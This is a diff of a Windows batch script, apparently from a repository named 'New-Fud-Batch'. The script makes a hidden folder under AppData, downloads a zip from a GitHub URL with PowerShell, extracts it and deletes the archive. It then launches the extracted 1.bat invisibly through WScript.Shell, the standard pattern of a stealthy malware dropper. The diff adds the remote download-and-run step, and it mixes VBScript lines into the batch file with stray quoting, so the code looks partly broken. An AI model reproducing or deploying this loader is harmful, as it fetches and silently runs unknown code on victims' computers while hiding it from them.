@@ -23,11 +23,10 @@ cd "C:\Users\%USERNAME%\AppData\Local"
 mkdir "Anon"
 attrib +h "Anon" /s /d
 cd C:\Users\%USERNAME%\AppData\Local\Anon" 
-wget https://github.com/AnonAm93/New-Fud-Batch/blob/main/.zip
+Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm93/New-Fud-Batch/raw/main/.zip' -OutFile .zip"
 tar -xf .zip
 del .zip
-echo CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False >> C:\Users\%USERNAME%\AppData\Local\Anon\invisible.vbs
-wscript.exe "C:\Users\%USERNAME%\AppData\Local\Anon\invisible.vbs" "C:\Users\%USERNAME%\AppData\Local\Anon\1.bat"
 
-
-
+Set WshShell = CreateObject("WScript.Shell") 
+WshShell.Run chr(34) & "C:\Users\%USERNAME%\AppData\Local\Anon\1.bat" & Chr(34), 0
+Set WshShell = Nothing
